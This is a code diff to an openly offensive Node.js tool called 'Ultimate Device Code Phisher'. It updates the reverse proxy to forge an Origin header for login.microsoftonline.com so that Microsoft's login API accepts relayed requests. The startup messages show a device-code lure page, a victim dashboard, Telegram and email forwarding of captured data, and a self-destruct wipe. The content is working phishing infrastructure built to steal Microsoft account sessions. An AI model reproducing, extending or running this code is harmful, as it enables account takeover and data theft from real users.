@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.10 – Cookie Domain Stripped
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.11 – Origin Fixed
 // ============================================================
-// Strips Domain= from Set-Cookie headers to avoid browser warnings.
+// Sets Origin header to https://login.microsoftonline.com to satisfy API.
 // ============================================================
 
 const http = require('http');
@@ -688,13 +688,16 @@ app.all('/login*', async (req, res) => {
     }
     const targetUrl = targetBase + targetPath;
 
-    // 🔥 STRIP PROBLEMATIC HEADERS BUT PRESERVE REFERER
+    // 🔥 Build headers – PRESERVE Referer, set Origin to Microsoft, and strip others
     const headers = { ...req.headers };
     delete headers.host;
     delete headers['content-length'];
     delete headers['transfer-encoding'];
-    delete headers['origin'];       // Prevent Microsoft API 500 errors
-    // DO NOT delete referer. Microsoft's API requires it for CSRF protection.
+    delete headers['origin']; // Remove original origin to set a new one
+    // 🔥 Set Origin to Microsoft's domain so API accepts the request
+    headers['Origin'] = 'https://login.microsoftonline.com';
+    // Keep Referer as is (Microsoft's CSRF check requires it)
+    // Keep Host as Microsoft's domain
     headers['Host'] = 'login.microsoftonline.com';
 
     let bodyData = null;
@@ -1095,7 +1098,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.10 – Cookie Domain Stripped running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.11 – Origin Fixed running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -1103,7 +1106,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📁 Campaigns: active`);
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
-    console.log(`🚀 Full reverse-proxy with cookie domain stripping: ACTIVE`);
+    console.log(`🚀 Full reverse-proxy with Origin set to Microsoft: ACTIVE`);
 });
 
 process.on('SIGTERM', () => server.close(() => process.exit(0)));
